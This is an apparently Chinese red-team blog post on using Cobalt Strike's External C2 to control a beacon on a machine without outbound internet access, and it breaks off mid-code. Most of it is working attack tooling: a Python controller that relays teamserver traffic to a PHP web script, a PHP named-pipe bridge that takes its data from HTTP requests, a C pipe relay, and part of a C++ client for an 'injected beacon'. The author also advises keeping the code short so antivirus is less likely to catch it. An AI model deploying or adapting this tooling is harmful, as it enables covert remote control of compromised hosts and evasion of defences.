<h2 id="ç”¨External-C2-è§£å†³ä¸å‡ºç½‘çš„é—®é¢˜"><a href="#ç”¨External-C2-è§£å†³ä¸å‡ºç½‘çš„é—®é¢˜" class="headerlink" title="ç”¨External C2 è§£å†³ä¸å‡ºç½‘çš„é—®é¢˜"></a>ç”¨External C2 è§£å†³ä¸å‡ºç½‘çš„é—®é¢˜</h2><p>è¿™ç§æƒ…å†µä½¿ç”¨client.php client.exe smb-beacon.exeä½œä¸ºä¸€ä¸ªé€šä¿¡é“¾è·¯ã€‚å…¶è¿ä½œæ–¹å¼æ˜¯ï¼Œclient.exeæ‰“å¼€ç®¡é“smb-beacon.exeåˆ›å»ºçš„<code>beacon</code>ç®¡é“ï¼Œè¯»å‡ºæ•°æ®å†™å…¥client.exeåˆ›å»ºçš„<code>clientread</code>ç®¡é“ï¼Œclient.phpæ‰“å¼€<code>clientread</code>ç®¡é“å°†æ•°æ®ä¼ å›ç¬¬ä¸‰æ–¹æ§åˆ¶å™¨ã€‚client.phpå°†ç¬¬ä¸‰æ–¹æ§åˆ¶å™¨ä¼ å…¥æ¥çš„æ•°æ®å†™å…¥client.exeåˆ›å»ºçš„<code>clientwrite</code>ç®¡é“ä¸­ï¼Œclient.exeå†è¯»å–<code>clientwrite</code>ç®¡é“ä¸­çš„æ•°æ®å†™å…¥<code>beacon</code>ç®¡é“ã€‚</p>
<p>client.exeåœ¨æ•´ä¸ªæµç¨‹ä¸­æ‰®æ¼”æ•°æ®ä¸­ç»§çš„è§’è‰²ï¼Œ<strong>ä¹‹æ‰€ä»¥éœ€è¦client.exeåšä¸­ç»§çš„æœ¬è´¨åŸå› æ˜¯å¯¹äºsmb beaconæ¥è¯´æ¯æ‰“å¼€ä¸€æ¬¡ï¼ˆfopenï¼‰ç›¸å½“äºå°±æ˜¯å»ºç«‹ä¸€ä¸ªæ–°çš„å¯¹è¯ï¼Œè€Œphpæ²¡æ³•å¯¹æ–‡ä»¶å¥æŸ„æŒä¹…åŒ–ï¼Œå¦‚æœç”¨phpç›´æ¥æ“ä½œ<code>beacon</code>æ¯æ¬¡è¯·æ±‚phpéƒ½ç›¸å½“äºä¸€æ¬¡å¦èµ·ç‚‰ç¶ï¼Œæ ¹æœ¬æ²¡æœ‰åŠæ³•å»ºç«‹è¿›è¡Œé€šä¿¡ã€‚æ‰€ä»¥client.exeå¯¹beaconå¥æŸ„åšæŒä¹…åŒ–</strong>ã€‚</p>
<p>ä»¥ä¸‹æ˜¯demoä»£ç ï¼ŒåŸºæœ¬æŠ„è¢­è‡ª<a href="https://github.com/hl0rey/Web_ExternalC2_Demo">hl0reyå¸ˆå‚…çš„é¡¹ç›®</a>ï¼Œä»£ç ä¸­ç»§ç®¡é“çš„cppä»£ç åªèƒ½åœ¨win10ä¸Šè·‘ï¼Œwin7ä¸Šè·‘ä¸äº†ï¼Œæš‚ä¸æ¸…æ¥šåŸå› ã€‚</p>
<p>æ§åˆ¶å™¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExternalC2Controller</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, port)</span>:</span></span><br><span class="line">        self.port = port</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encodeFrame</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>, len(data)) + data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sendToTS</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Send To Ts "</span> + self.encodeFrame(data)</span><br><span class="line">        self._socketTS.sendall(self.encodeFrame(data))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recvFromTS</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = <span class="string">""</span></span><br><span class="line">        _len =  self._socketTS.recv(<span class="number">4</span>)</span><br><span class="line">        l = struct.unpack(<span class="string">"&lt;I"</span>,_len)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">while</span> len(data) &lt; l:</span><br><span class="line">            data += self._socketTS.recv(l - len(data))</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sendToBeacon</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        params[<span class="string">'action'</span>] = <span class="string">"write"</span></span><br><span class="line">        params[<span class="string">'pipename'</span>] = <span class="string">"hlwrite"</span></span><br><span class="line">        params[<span class="string">'data'</span>] = self.encodeFrame(data)</span><br><span class="line">        resp = requests.post(url=URL, data=params, timeout=<span class="number">30</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Write Content: "</span> + resp.text</span><br><span class="line">        params[<span class="string">'data'</span>] = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recvFromBeacon</span><span class="params">(self)</span>:</span></span><br><span class="line">        params[<span class="string">'action'</span>] = <span class="string">"read"</span></span><br><span class="line">        params[<span class="string">'pipename'</span>] = <span class="string">"hlread"</span></span><br><span class="line">        resp = requests.get(url=URL, params=params, timeout=<span class="number">30</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Read Content: "</span> + resp.text</span><br><span class="line">        <span class="keyword">return</span> resp.content</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        self._socketTS = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)</span><br><span class="line">        self._socketTS.connect((<span class="string">"127.0.0.1"</span>, self.port))</span><br><span class="line"></span><br><span class="line">        self.sendToTS(<span class="string">"arch=x64"</span>)</span><br><span class="line">        self.sendToTS(<span class="string">"pipename=xpntest"</span>)</span><br><span class="line">        self.sendToTS(<span class="string">"block=500"</span>)</span><br><span class="line">        self.sendToTS(<span class="string">"go"</span>)</span><br><span class="line"></span><br><span class="line">        data = self.recvFromTS()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">            data = self.recvFromBeacon()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Received %d bytes from beacon"</span> % len(data)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Sending %d bytes to TS"</span> % len(data)</span><br><span class="line">            self.sendToTS(data)</span><br><span class="line"></span><br><span class="line">            data = self.recvFromTS()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Received %d bytes from TS"</span> % len(data)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Sending %d bytes to beacon"</span> % len(data)</span><br><span class="line">            self.sendToBeacon(data)</span><br><span class="line">            </span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line"><span class="comment">#URL = "http://172.16.247.145/pipe.php"</span></span><br><span class="line">URL = <span class="string">"http://172.16.247.145/index.php"</span></span><br><span class="line">params = &#123;<span class="string">"pipename"</span>:<span class="string">"xpntest"</span>, <span class="string">"action"</span>:<span class="string">""</span>, <span class="string">"data"</span>:<span class="string">""</span>&#125;</span><br><span class="line">controller = ExternalC2Controller(<span class="number">2222</span>)</span><br><span class="line">controller.run()</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">recvFromBeacon</span><span class="params">($pipename)</span></span>&#123;</span><br><span class="line">        $fp = fopen($pipename, <span class="string">"rb"</span>);</span><br><span class="line">        $len=fread($fp, <span class="number">4</span>);</span><br><span class="line">        $len=unpack(<span class="string">"v"</span>, $len)[<span class="number">1</span>];</span><br><span class="line">        $data=fread($fp, $len);</span><br><span class="line">        fclose($fp);</span><br><span class="line">        <span class="keyword">echo</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">sendToBeacon</span><span class="params">($pipename)</span></span>&#123;</span><br><span class="line">        $fp = fopen($pipename, <span class="string">"wb"</span>);</span><br><span class="line">        $data=$_REQUEST[<span class="string">"data"</span>];</span><br><span class="line">        fwrite($fp, $data);</span><br><span class="line">        fclose($fp);</span><br><span class="line">        <span class="keyword">echo</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'action'</span>]) &amp;&amp; $_REQUEST[<span class="string">'pipename'</span>])&#123;</span><br><span class="line">        $pipename = <span class="string">'\\\\.\\pipe\\'</span>.$_REQUEST[<span class="string">'pipename'</span>];</span><br><span class="line">        <span class="keyword">if</span> ($_REQUEST[<span class="string">'action'</span>]==<span class="string">'read'</span>)&#123;</span><br><span class="line">            recvFromBeacon($pipename);</span><br><span class="line">        &#125;<span class="keyword">elseif</span> ($_REQUEST[<span class="string">'action'</span>]==<span class="string">'write'</span>)&#123;</span><br><span class="line">            sendToBeacon($pipename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">'HTTP/1.1 404 Not Found'</span>);</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'404'</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ä¸­ç»§ä»£ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#define PAYLOAD_MAX_SIZE 512 * 1024</span><br><span class="line">#define BUFFER_MAX_SIZE 1024 * 1024</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;æ¡¥ï¼Œå­—é¢æ„æ€ã€‚æ–¹ä¾¿æŠŠè‡ªå®šä¹‰çš„ç®¡é“å’Œbeaconç®¡é“æ¡¥æ¥çš„ç»“æ„ä½“</span><br><span class="line">struct BRIDGE</span><br><span class="line">&#123;</span><br><span class="line">	HANDLE client;</span><br><span class="line">	HANDLE server;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;ä»beaconè¯»å–æ•°æ®</span><br><span class="line">DWORD read_frame(HANDLE my_handle, char* buffer, DWORD max) &#123;</span><br><span class="line"></span><br><span class="line">	DWORD size &#x3D; 0, temp &#x3D; 0, total &#x3D; 0;</span><br><span class="line">	&#x2F;* read the 4-byte length *&#x2F;</span><br><span class="line">	ReadFile(my_handle, (char*)&amp; size, 4, &amp;temp, NULL);</span><br><span class="line">	printf(&quot;read_frame length: %d\n&quot;, size);</span><br><span class="line">	&#x2F;* read the whole thing in *&#x2F;</span><br><span class="line">	while (total &lt; size) &#123;</span><br><span class="line">		ReadFile(my_handle, buffer + total, size - total, &amp;temp,</span><br><span class="line">			NULL);</span><br><span class="line">		total +&#x3D; temp;</span><br><span class="line">	&#125;</span><br><span class="line">	return size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;å‘beaconå†™å…¥æ•°æ®</span><br><span class="line">void write_frame(HANDLE my_handle, char* buffer, DWORD length) &#123;</span><br><span class="line">	printf(&quot;write_frame length: %d\n&quot;, length);</span><br><span class="line">	DWORD wrote &#x3D; 0;</span><br><span class="line">	WriteFile(my_handle, (void*)&amp; length, 4, &amp;wrote, NULL);</span><br><span class="line">	printf(&quot;write %d bytes.\n&quot;, wrote);</span><br><span class="line">	WriteFile(my_handle, buffer, length, &amp;wrote, NULL);</span><br><span class="line">	printf(&quot;write %d bytes.\n&quot;, wrote);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;ä»æ§åˆ¶å™¨è¯»å–æ•°æ®</span><br><span class="line">DWORD read_client(HANDLE my_handle, char* buffer) &#123;</span><br><span class="line">	DWORD size &#x3D; 0;</span><br><span class="line">	DWORD readed &#x3D; 0;</span><br><span class="line">	ReadFile(my_handle, &amp;size, 4, NULL, NULL);</span><br><span class="line">	printf(&quot;read_client length: %d\n&quot;, size);</span><br><span class="line">	ReadFile(my_handle, buffer, size, &amp;readed, NULL);</span><br><span class="line">	printf(&quot;final data from client: %d\n&quot;, readed);</span><br><span class="line">	return readed;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;å‘æ§åˆ¶å™¨å†™å…¥æ•°æ®</span><br><span class="line">void write_client(HANDLE my_handle, char* buffer, DWORD length) &#123;</span><br><span class="line">	DWORD wrote &#x3D; 0;</span><br><span class="line">	WriteFile(my_handle, buffer, length, &amp;wrote, NULL);</span><br><span class="line">	printf(&quot;write client total %d data %d\n&quot;, wrote, length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;å®¢æˆ·ç«¯è¯»ç®¡é“ã€æœåŠ¡ç«¯å†™ç®¡é“é€»è¾‘</span><br><span class="line">DWORD WINAPI ReadOnlyPipeProcess(LPVOID lpvParam) &#123;</span><br><span class="line">	&#x2F;&#x2F;æŠŠä¸¤æ¡ç®¡é“çš„å¥æŸ„å–å‡ºæ¥</span><br><span class="line">	struct BRIDGE* bridge &#x3D; (struct BRIDGE*)lpvParam;</span><br><span class="line">	HANDLE hpipe &#x3D; bridge-&gt;client;</span><br><span class="line">	HANDLE beacon &#x3D; bridge-&gt;server;</span><br><span class="line">	</span><br><span class="line">	DWORD length &#x3D; 0;</span><br><span class="line">	char* buffer &#x3D; VirtualAlloc(0, BUFFER_MAX_SIZE, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	if (buffer &#x3D;&#x3D; NULL)</span><br><span class="line">	&#123;</span><br><span class="line">		exit(-1);</span><br><span class="line">	&#125;</span><br><span class="line">	&#x2F;&#x2F;å†æ¬¡æ ¡éªŒç®¡é“</span><br><span class="line">	if ((hpipe &#x3D;&#x3D; INVALID_HANDLE_VALUE) || (beacon &#x3D;&#x3D; INVALID_HANDLE_VALUE))</span><br><span class="line">	&#123;</span><br><span class="line">		return FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	while (TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		if (ConnectNamedPipe(hpipe, NULL))</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;client want read.\n&quot;);</span><br><span class="line">			length &#x3D; read_frame(beacon, buffer, BUFFER_MAX_SIZE);</span><br><span class="line">			printf(&quot;read from beacon: %d\n&quot;, length);</span><br><span class="line">			&#x2F;&#x2F;åˆ†ä¸¤æ¬¡ä¼ é€ï¼Œå‘ä¸€æ¬¡é•¿åº¦ï¼Œå†å‘æ•°æ®ã€‚</span><br><span class="line">			write_client(hpipe,(char *) &amp;length, 4);</span><br><span class="line">			FlushFileBuffers(hpipe);</span><br><span class="line">			write_client(hpipe, buffer, length);</span><br><span class="line">			FlushFileBuffers(hpipe);</span><br><span class="line">			DisconnectNamedPipe(hpipe);</span><br><span class="line">			&#x2F;&#x2F;æ¸…ç©ºç¼“å­˜åŒº</span><br><span class="line">			ZeroMemory(buffer, BUFFER_MAX_SIZE);</span><br><span class="line">			length &#x3D; 0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;å®¢æˆ·ç«¯å†™ç®¡é“ã€æœåŠ¡ç«¯è¯»ç®¡é“é€»è¾‘</span><br><span class="line">DWORD WINAPI WriteOnlyPipeProcess(LPVOID lpvParam) &#123;</span><br><span class="line">	&#x2F;&#x2F;å–å‡ºä¸¤æ¡ç®¡é“</span><br><span class="line">	struct BRIDGE* bridge &#x3D; (struct BRIDGE*)lpvParam;</span><br><span class="line">	HANDLE hpipe &#x3D; bridge-&gt;client;</span><br><span class="line">	HANDLE beacon &#x3D; bridge-&gt;server;</span><br><span class="line">	</span><br><span class="line">	DWORD length &#x3D; 0;</span><br><span class="line">	char* buffer &#x3D; VirtualAlloc(0, BUFFER_MAX_SIZE, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	if (buffer &#x3D;&#x3D; NULL)</span><br><span class="line">	&#123;</span><br><span class="line">		exit(-1);</span><br><span class="line">	&#125;</span><br><span class="line">	if ((hpipe &#x3D;&#x3D; INVALID_HANDLE_VALUE) || (beacon &#x3D;&#x3D; INVALID_HANDLE_VALUE))</span><br><span class="line">	&#123;</span><br><span class="line">		return FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	while (TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		if (ConnectNamedPipe(hpipe, NULL))</span><br><span class="line">		&#123;</span><br><span class="line">			&#x2F;&#x2F;ä¸€æ¬¡æ€§è¯»ï¼Œä¸€æ¬¡æ€§å†™</span><br><span class="line">			printf(&quot;client want write.\n&quot;);</span><br><span class="line">			length &#x3D; read_client(hpipe, buffer);</span><br><span class="line">			printf(&quot;read from client: %d\n&quot;, length);</span><br><span class="line">			write_frame(beacon, buffer, length);</span><br><span class="line">			DisconnectNamedPipe(hpipe);</span><br><span class="line">			&#x2F;&#x2F;æ¸…ç©ºç¼“å­˜åŒº</span><br><span class="line">			ZeroMemory(buffer, BUFFER_MAX_SIZE);</span><br><span class="line">			length &#x3D; 0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return 2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[]) &#123;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;åˆ›å»ºå®¢æˆ·ç«¯è¯»ç®¡é“</span><br><span class="line">	HANDLE hPipeRead &#x3D; CreateNamedPipe(&quot;\\\\.\\pipe\\hlread&quot;, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, BUFFER_MAX_SIZE, BUFFER_MAX_SIZE, 0, NULL);</span><br><span class="line">	&#x2F;&#x2F;åˆ›å»ºå®¢æˆ·ç«¯å†™ç®¡é“</span><br><span class="line">	HANDLE hPipeWrite &#x3D; CreateNamedPipe(&quot;\\\\.\\pipe\\hlwrite&quot;, PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, BUFFER_MAX_SIZE, BUFFER_MAX_SIZE, 0, NULL);</span><br><span class="line">	&#x2F;&#x2F;ä¸beaconå»ºç«‹è¿æ¥</span><br><span class="line">	HANDLE hfileServer &#x3D; CreateFileA(&quot;\\\\.\\pipe\\hltest&quot;, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;æ£€æµ‹ç®¡é“å’Œè¿æ¥æ˜¯å¦å»ºç«‹æˆåŠŸ</span><br><span class="line">	if ((hPipeRead &#x3D;&#x3D; INVALID_HANDLE_VALUE) || (hPipeWrite &#x3D;&#x3D; INVALID_HANDLE_VALUE) || (hfileServer &#x3D;&#x3D; INVALID_HANDLE_VALUE))</span><br><span class="line">	&#123;</span><br><span class="line">		if (hPipeRead &#x3D;&#x3D; INVALID_HANDLE_VALUE)</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;error during create readpipe.&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		if (hPipeWrite &#x3D;&#x3D; INVALID_HANDLE_VALUE)</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;error during create writepipe.&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		if (hfileServer &#x3D;&#x3D; INVALID_HANDLE_VALUE)</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;error during connect to beacon.&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		exit(-1);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;	</span><br><span class="line">		&#x2F;&#x2F;ä¸€åˆ‡æ­£å¸¸</span><br><span class="line">		printf(&quot;all pipes are ok.\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	&#x2F;&#x2F;æ”¾å…¥å®¢æˆ·ç«¯è¯»ç®¡é“å’Œbeaconè¿æ¥</span><br><span class="line">	struct BRIDGE readbridge;</span><br><span class="line">	readbridge.client &#x3D; hPipeRead;</span><br><span class="line">	readbridge.server &#x3D; hfileServer;</span><br><span class="line">	&#x2F;&#x2F;å¯åŠ¨å®¢æˆ·ç«¯è¯»ç®¡é“é€»è¾‘</span><br><span class="line">	HANDLE hTPipeRead &#x3D; CreateThread(NULL, 0, ReadOnlyPipeProcess, (LPVOID)&amp; readbridge, 0, NULL);</span><br><span class="line">	</span><br><span class="line">	&#x2F;&#x2F;æ”¾å…¥å®¢æˆ·ç«¯å†™ç®¡é“å’Œbeaconè¿æ¥</span><br><span class="line">	struct BRIDGE writebridge;</span><br><span class="line">	writebridge.client &#x3D; hPipeWrite;</span><br><span class="line">	writebridge.server &#x3D; hfileServer;</span><br><span class="line">	&#x2F;&#x2F;å¯åŠ¨å®¢æˆ·ç«¯å†™ç®¡é“é€»è¾‘</span><br><span class="line">	HANDLE hTPipeWrite &#x3D; CreateThread(NULL, 0, WriteOnlyPipeProcess, (LPVOID)&amp; writebridge, 0, NULL);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;ä»£ç æ²¡æœ‰ä»€ä¹ˆæ„ä¹‰ï¼Œç›´æ¥å†™ä¸ªæ­»å¾ªç¯ä¹Ÿè¡Œ</span><br><span class="line">	HANDLE waitHandles[] &#x3D; &#123; hPipeRead,hPipeWrite &#125;;</span><br><span class="line">	while (TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		WaitForMultipleObjects(2, waitHandles, TRUE, INFINITE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="æ‚"><a href="#æ‚" class="headerlink" title="æ‚"></a>æ‚</h2><h3 id="å…¶å®ƒå‘ç‚¹"><a href="#å…¶å®ƒå‘ç‚¹" class="headerlink" title="å…¶å®ƒå‘ç‚¹"></a>å…¶å®ƒå‘ç‚¹</h3><p>phpæ–‡ä»¶æ³¨æ„å»BOMå¤´%EF%BB%BF</p>
<h3 id="è¯»å†™ç®¡é“çš„cppä»£ç "><a href="#è¯»å†™ç®¡é“çš„cppä»£ç " class="headerlink" title="è¯»å†™ç®¡é“çš„cppä»£ç "></a>è¯»å†™ç®¡é“çš„cppä»£ç </h3><p>cobaltstrike è‡ªå·±ç”Ÿæˆsmb beaconï¼Œå‰¥ç¦»æ‰ç¬¬ä¸‰æ–¹æ³¨å…¥shellcodeçš„åŠŸèƒ½ã€‚è¿™ä¹ˆåšçš„åŸå› æ˜¯å®é™…æƒ…å†µä¸­ä»£ç è¶ŠçŸ­è¶Šä¸å¥½æ€ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">// ConsoleApplication2.cpp : This file contains the <span class="string">'main'</span> function. Program execution begins <span class="keyword">and</span> ends there.</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line"><span class="comment">#include "pch.h"</span></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include &lt;WinSock2.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;ShellAPI.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;Shlobj.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pragma comment(lib,"ws2_32.lib")</span></span><br><span class="line"><span class="comment">#pragma comment(lib,"user32.lib")</span></span><br><span class="line"><span class="comment">#pragma comment(lib,"Advapi32.lib")  </span></span><br><span class="line"><span class="comment">#pragma comment(lib,"Shell32.lib")</span></span><br><span class="line"><span class="comment">#pragma warning(disable:4996)</span></span><br><span class="line"></span><br><span class="line">using std::cout;</span><br><span class="line">using std::endl;</span><br><span class="line">// Sends data to our C2 controller received <span class="keyword">from</span> our injected beacon</span><br><span class="line">void sendData(SOCKET sd, const char *data, DWORD len) &#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">"Sends data to our C2 controller received from our injected beacon"</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">	char *buffer = (char *)malloc(len + <span class="number">4</span>);</span><br><span class="line">	<span class="keyword">if</span> (buffer == NULL)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	DWORD bytesWritten = <span class="number">0</span>, totalLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	*(DWORD *)buffer = len;</span><br><span class="line">	memcpy(buffer + <span class="number">4</span>, data, len);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (totalLen &lt; len + <span class="number">4</span>) &#123;</span><br><span class="line">		bytesWritten = send(sd, buffer + totalLen, len + <span class="number">4</span> - totalLen, <span class="number">0</span>);</span><br><span class="line">		totalLen += bytesWritten;</span><br><span class="line">	&#125;</span><br><span class="line">	free(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Receives data <span class="keyword">from</span> our C2 controller to be relayed to the injected beacon</span><br><span class="line">char *recvData(SOCKET sd, DWORD *len) &#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">"Receives data from our C2 controller to be relayed to the injected beacon"</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">	char *buffer;</span><br><span class="line">	DWORD bytesReceived = <span class="number">0</span>, totalLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	*len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	recv(sd, (char *)len, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">	buffer = (char *)malloc(*len);</span><br><span class="line">	<span class="keyword">if</span> (buffer == NULL)</span><br><span class="line">		<span class="keyword">return</span> NULL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (totalLen &lt; *len) &#123;</span><br><span class="line">		bytesReceived = recv(sd, buffer + totalLen, *len - totalLen, <span class="number">0</span>);</span><br><span class="line">		totalLen += bytesReceived;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Creates a new C2 controller connection <span class="keyword">for</span> relaying commands</span><br><span class="line">SOCKET createC2Socket(const char *addr, WORD port) &#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">"Creates a new C2 controller connection for relaying commands"</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">	WSADATA wsd;</span><br><span class="line">	SOCKET sd;</span><br><span class="line">	SOCKADDR_IN sin;</span><br><span class="line">	WSAStartup(<span class="number">0x0202</span>, &amp;wsd);</span><br><span class="line"></span><br><span class="line">	memset(&amp;sin, <span class="number">0</span>, sizeof(sin));</span><br><span class="line">	sin.sin_family = AF_INET;</span><br><span class="line">	sin.sin_port = htons(port);</span><br><span class="line">	sin.sin_addr.S_un.S_addr = inet_addr(addr);</span><br><span class="line"></span><br><span class="line">	sd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);</span><br><span class="line">	connect(sd, (SOCKADDR*)&amp;sin, sizeof(sin));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Connects to the name pipe spawned by the injected beacon</span><br><span class="line">HANDLE connectBeaconPipe(const char *pipeName) &#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">"Connects to the name pipe spawned by the injected beacon"</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">	HANDLE beaconPipe;</span><br><span class="line"></span><br><span class="line">	beaconPipe = CreateFileA(pipeName, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, NULL, OPEN_EXISTING, NULL, NULL);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> beaconPipe;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Receives data <span class="keyword">from</span> our injected beacon via a named pipe</span><br><span class="line">char *recvFromBeacon(HANDLE pipe, DWORD *len) &#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">"Receives data from our injected beacon via a named pipe"</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">	char *buffer;</span><br><span class="line">	DWORD bytesRead = <span class="number">0</span>, totalLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	*len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	ReadFile(pipe, len, <span class="number">4</span>, &amp;bytesRead, NULL);</span><br><span class="line">	buffer = (char *)malloc(*len);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (totalLen &lt; *len) &#123;</span><br><span class="line">		ReadFile(pipe, buffer + totalLen, *len - totalLen, &amp;bytesRead, NULL);</span><br><span class="line">		totalLen += bytesRead;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Write data to our injected beacon via a named 